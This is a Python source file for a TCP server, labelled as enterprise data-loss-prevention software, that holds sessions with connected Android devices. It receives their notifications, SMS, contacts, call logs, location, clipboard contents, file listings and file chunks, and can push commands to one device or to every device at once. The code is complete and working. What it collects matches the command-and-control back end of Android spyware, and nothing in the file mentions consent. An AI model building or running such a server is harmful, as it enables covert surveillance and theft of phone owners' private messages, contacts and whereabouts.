"""
ATHEX DLP Enterprise - TCP Server
==================================
Multi-threaded TCP server for Android device connections.
Handles persistent socket connections, message parsing,
and bidirectional communication with connected devices.
"""

import socket
import threading
import logging
import time
import hashlib
from datetime import datetime
from typing import Dict, Optional, Callable, List, Tuple
from concurrent.futures import ThreadPoolExecutor

from config import Config

logger = logging.getLogger(__name__)


class TCPServer:
    """
    Multi-threaded TCP Server for Android client connections.
    
    Features:
    - Non-blocking I/O with threading
    - Session management
    - Message protocol parsing (App|Title|Body format)
    - Heartbeat monitoring
    - Connection pooling
    - Graceful shutdown
    """
    
    def __init__(self, host: str = None, port: int = None):
        """
        Initialize TCP Server.
        
        Args:
            host: Bind address (default from config)
            port: Bind port (default from config)
        """
        self.config = Config()
        self.host = host or self.config.TCP_HOST
        self.port = port or self.config.TCP_PORT
        
        # Server socket
        self.server_socket: Optional[socket.socket] = None
        
        # Thread management
        self.server_thread: Optional[threading.Thread] = None
        self.executor = ThreadPoolExecutor(max_workers=self.config.MAX_CLIENTS + 10)
        self.running = False
        self.accept_thread: Optional[threading.Thread] = None
        
        # Active sessions
        self.sessions: Dict[str, 'ClientSession'] = {}
        self.session_lock = threading.RLock()
        
        # Message handler
        self.message_handler: Optional[Callable] = None
        
        # Statistics
        self.total_connections = 0
        self.total_messages = 0
        self.total_bytes_received = 0
        self.total_bytes_sent = 0
        self.start_time: Optional[float] = None
        
        logger.info(f"TCP Server initialized: {self.host}:{self.port}")
    
    def set_message_handler(self, handler: Callable):
        """Set callback for incoming messages"""
        self.message_handler = handler
    
    def start(self):
        """Start the TCP server"""
        if self.running:
            logger.warning("TCP Server already running")
            return
        
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            self.server_socket.settimeout(1.0)  # 1 second timeout for accept()
            
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(self.config.MAX_CLIENTS)
            
            self.running = True
            self.start_time = time.time()
            
            # Start accept thread
            self.accept_thread = threading.Thread(
                target=self._accept_connections,
                name="TCP-Accept",
                daemon=True
            )
            self.accept_thread.start()
            
            logger.info(f"✅ TCP Server started on {self.host}:{self.port}")
            
        except socket.error as e:
            logger.error(f"Socket error starting TCP Server: {e}")
            self.running = False
            raise
        except Exception as e:
            logger.error(f"Failed to start TCP Server: {e}")
            self.running = False
            raise
    
    def stop(self):
        """Stop the TCP server gracefully"""
        logger.info("Stopping TCP Server...")
        self.running = False
        
        # Close all client connections
        with self.session_lock:
            for session_id, session in list(self.sessions.items()):
                try:
                    session.close()
                except socket.error as e:
                    logger.warning(f"Socket error closing session {session_id}: {e}")
                except Exception as e:
                    logger.warning(f"Error closing session {session_id}: {e}")
            self.sessions.clear()
        
        # Close server socket
        if self.server_socket:
            try:
                self.server_socket.close()
            except socket.error as e:
                logger.warning(f"Socket error closing server: {e}")
            except Exception as e:
                logger.warning(f"Error closing server socket: {e}")
        
        # Shutdown executor
        self.executor.shutdown(wait=False)
        
        # Wait for accept thread
        if self.accept_thread and self.accept_thread.is_alive():
            self.accept_thread.join(timeout=5)
        
        uptime = time.time() - self.start_time if self.start_time else 0
        logger.info(f"✅ TCP Server stopped. Uptime: {uptime:.1f}s")
    
    def _accept_connections(self):
        """Accept incoming connections in a loop"""
        logger.info("Accept thread started")
        
        while self.running:
            try:
                client_socket, address = self.server_socket.accept()
                
                logger.info(f"New connection from {address[0]}:{address[1]}")
                
                # Create session
                session_id = self._generate_session_id(address)
                
                session = ClientSession(
                    session_id=session_id,
                    socket=client_socket,
                    address=address,
                    server=self
                )
                
                # Add to sessions
                with self.session_lock:
                    self.sessions[session_id] = session
                
                self.total_connections += 1
                
                # Handle client in thread pool
                self.executor.submit(self._handle_client, session)
                
            except socket.timeout:
                continue
            except socket.error as e:
                if self.running:
                    logger.error(f"Socket accept error: {e}")
                break
            except Exception as e:
                if self.running:
                    logger.error(f"Accept error: {e}")
                break
        
        logger.info("Accept thread stopped")
    
    def _handle_client(self, session: 'ClientSession'):
        """Handle individual client connection"""
        logger.info(f"[{session.session_id}] Handling client {session.address}")
        
        try:
            session.connected = True
            session.connected_at = datetime.now().isoformat()
            
            buffer = ""
            
            while self.running and session.connected:
                try:
                    data = session.socket.recv(self.config.BUFFER_SIZE)
                    
                    if not data:
                        logger.info(f"[{session.session_id}] Client disconnected")
                        break
                    
                    decoded = data.decode('utf-8', errors='ignore')
                    buffer += decoded
                    self.total_bytes_received += len(data)
                    
                    # Process complete messages
                    while '\n' in buffer:
                        line, buffer = buffer.split('\n', 1)
                        self._process_message(session, line.strip())
                    
                except socket.timeout:
                    continue
                except ConnectionResetError:
                    logger.warning(f"[{session.session_id}] Connection reset by peer")
                    break
                except ConnectionAbortedError:
                    logger.warning(f"[{session.session_id}] Connection aborted")
                    break
                except socket.error as e:
                    logger.error(f"[{session.session_id}] Socket read error: {e}")
                    break
                except Exception as e:
                    logger.error(f"[{session.session_id}] Read error: {e}")
                    break
                
        finally:
            session.close()
            with self.session_lock:
                if session.session_id in self.sessions:
                    del self.sessions[session.session_id]
            
            logger.info(f"[{session.session_id}] Session ended")
    
    def _process_message(self, session: 'ClientSession', message: str):
        """Process incoming message from client"""
        if not message:
            return
        
        self.total_messages += 1
        
        # Parse message type
        if '|' in message:
            parts = message.split('|', 1)
            msg_type = parts[0].upper()
            msg_data = parts[1] if len(parts) > 1 else ""
        else:
            msg_type = message.upper()
            msg_data = ""
        
        # Update session activity
        session.last_activity = time.time()
        
        # Handle different message types
        if msg_type == "DEVICE_INFO":
            self._handle_device_info(session, msg_data)
        
        elif msg_type == "HEARTBEAT":
            self._handle_heartbeat(session, msg_data)
        
        elif msg_type == "NOTIFICATION":
            self._handle_notification(session, msg_data)
        
        elif msg_type == "FILE_LISTING":
            self._handle_file_listing(session, msg_data)
        
        elif msg_type == "FILE_CHUNK":
            self._handle_file_chunk(session, msg_data)
        
        elif msg_type == "CONTACTS_LIST":
            self._handle_contacts_list(session, msg_data)
        
        elif msg_type == "SMS_LIST":
            self._handle_sms_list(session, msg_data)
        
        elif msg_type == "CALL_LOGS":
            self._handle_call_logs(session, msg_data)
        
        elif msg_type == "LOCATION_UPDATE":
            self._handle_location_update(session, msg_data)
        
        elif msg_type == "CLIPBOARD":
            self._handle_clipboard(session, msg_data)
        
        elif msg_type == "STATUS":
            self._handle_status(session, msg_data)
        
        elif msg_type == "ERROR":
            self._handle_error(session, msg_data)
        
        # Forward to custom handler
        if self.message_handler:
            try:
                self.message_handler(session.session_id, msg_type, msg_data)
            except Exception as e:
                logger.error(f"Message handler error: {e}")
    
    def _handle_device_info(self, session: 'ClientSession', data: str):
        """Handle device info message"""
        parts = data.split('|')
        if len(parts) >= 4:
            session.device_model = parts[0]
            session.android_version = parts[1]
            session.device_id = parts[2]
            session.ip_address = parts[3]
            
            if len(parts) >= 5:
                session.manufacturer = parts[4]
            if len(parts) >= 6:
                session.product = parts[5]
        
        logger.info(f"[{session.session_id}] Device: {session.device_model} (Android {session.android_version})")
    
    def _handle_heartbeat(self, session: 'ClientSession', data: str):
        """Handle heartbeat message"""
        session.last_heartbeat = time.time()
        logger.debug(f"[{session.session_id}] Heartbeat received")
    
    def _handle_notification(self, session: 'ClientSession', data: str):
        """Handle notification message"""
        parts = data.split('|', 2)
        if len(parts) >= 3:
            notification = {
                "session_id": session.session_id,
                "app_name": parts[0],
                "title": parts[1],
                "body": parts[2],
                "timestamp": datetime.now().isoformat(),
                "device_model": session.device_model
            }
            
            session.notification_count += 1
            
            if self.message_handler:
                self.message_handler(session.session_id, "NOTIFICATION", notification)
    
    def _handle_file_listing(self, session: 'ClientSession', data: str):
        """Handle file listing response"""
        if self.message_handler:
            self.message_handler(session.session_id, "FILE_LISTING", data)
    
    def _handle_file_chunk(self, session: 'ClientSession', data: str):
        """Handle file chunk data"""
        if self.message_handler:
            self.message_handler(session.session_id, "FILE_CHUNK", data)
    
    def _handle_contacts_list(self, session: 'ClientSession', data: str):
        """Handle contacts list response"""
        if self.message_handler:
            self.message_handler(session.session_id, "CONTACTS", data)
    
    def _handle_sms_list(self, session: 'ClientSession', data: str):
        """Handle SMS list response"""
        if self.message_handler:
            self.message_handler(session.session_id, "SMS", data)
    
    def _handle_call_logs(self, session: 'ClientSession', data: str):
        """Handle call logs response"""
        if self.message_handler:
            self.message_handler(session.session_id, "CALLS", data)
    
    def _handle_location_update(self, session: 'ClientSession', data: str):
        """Handle location update"""
        if self.message_handler:
            self.message_handler(session.session_id, "LOCATION", data)
    
    def _handle_clipboard(self, session: 'ClientSession', data: str):
        """Handle clipboard data"""
        if self.message_handler:
            self.message_handler(session.session_id, "CLIPBOARD", data)
    
    def _handle_status(self, session: 'ClientSession', data: str):
        """Handle status message"""
        logger.info(f"[{session.session_id}] Status: {data}")
    
    def _handle_error(self, session: 'ClientSession', data: str):
        """Handle error message"""
        logger.error(f"[{session.session_id}] Client Error: {data}")
    
    def send_to_client(self, session_id: str, message: str) -> bool:
        """Send message to specific client"""
        with self.session_lock:
            session = self.sessions.get(session_id)
        
        if session and session.connected:
            return session.send(message)
        
        return False
    
    def broadcast(self, message: str, exclude: str = None):
        """Broadcast message to all connected clients"""
        with self.session_lock:
            sessions = list(self.sessions.items())
        
        for session_id, session in sessions:
            if exclude and session_id == exclude:
                continue
            session.send(message)
    
    def get_session(self, session_id: str) -> Optional['ClientSession']:
        """Get session by ID"""
        with self.session_lock:
            return self.sessions.get(session_id)
    
    def get_all_sessions(self) -> List[Dict]:
        """Get all active sessions as dictionaries"""
        with self.session_lock:
            return [session.to_dict() for session in self.sessions.values()]
    
    def get_session_count(self) -> int:
        """Get number of active sessions"""
        with self.session_lock:
            return len(self.sessions)
    
    def _generate_session_id(self, address: Tuple[str, int]) -> str:
        """Generate unique session ID"""
        raw = f"{address[0]}:{address[1]}:{time.time()}"
        return hashlib.sha256(raw.encode()).hexdigest()[:16]
    
    def get_stats(self) -> Dict:
        """Get server statistics"""
        return {
            "running": self.running,
            "host": self.host,
            "port": self.port,
            "active_sessions": self.get_session_count(),
            "total_connections": self.total_connections,
            "total_messages": self.total_messages,
            "bytes_received": self.total_bytes_received,
            "bytes_sent": self.total_bytes_sent,
            "uptime_seconds": time.time() - self.start_time if self.start_time else 0
        }


class ClientSession:
    """Represents a connected Android client"""
    
    def __init__(self, session_id: str, socket: socket.socket, 
                 address: Tuple[str, int], server: TCPServer):
        self.session_id = session_id
        self.socket = socket
        self.address = address
        self.server = server
        
        # State
        self.connected = False
        self.connected_at: Optional[str] = None
        self.last_activity = time.time()
        self.last_heartbeat = time.time()
        
        # Device info
        self.device_model = "Unknown"
        self.android_version = "Unknown"
        self.device_id = "Unknown"
        self.ip_address = address[0]
        self.manufacturer = "Unknown"
        self.product = "Unknown"
        
        # Statistics
        self.notification_count = 0
        self.messages_sent = 0
        self.messages_received = 0
        
        # Set socket options
        try:
            self.socket.settimeout(30)
            self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except socket.error as e:
            logger.warning(f"[{self.session_id}] Failed to set socket options: {e}")
        except Exception as e:
            logger.warning(f"[{self.session_id}] Unexpected error setting socket options: {e}")
    
    def send(self, message: str) -> bool:
        """Send message to this client"""
        try:
            if not message.endswith('\n'):
                message += '\n'
            
            self.socket.send(message.encode('utf-8'))
            self.messages_sent += 1
            return True
            
        except socket.error as e:
            logger.error(f"[{self.session_id}] Socket send error: {e}")
            self.connected = False
            return False
        except Exception as e:
            logger.error(f"[{self.session_id}] Send error: {e}")
            self.connected = False
            return False
    
    def close(self):
        """Close this session"""
        self.connected = False
        try:
            self.socket.close()
        except socket.error as e:
            logger.debug(f"[{self.session_id}] Socket close error: {e}")
        except Exception as e:
            logger.debug(f"[{self.session_id}] Close error: {e}")
    
    def to_dict(self) -> Dict:
        """Convert session to dictionary"""
        return {
            "session_id": self.session_id,
            "address": f"{self.address[0]}:{self.address[1]}",
            "connected": self.connected,
            "connected_at": self.connected_at,
            "device_model": self.device_model,
            "android_version": self.android_version,
            "device_id": self.device_id,
            "manufacturer": self.manufacturer,
            "product": self.product,
            "notification_count": self.notification_count,
            "messages_sent": self.messages_sent,
            "messages_received": self.messages_received,
            "last_activity": self.last_activity,
            "last_heartbeat": self.last_heartbeat
        }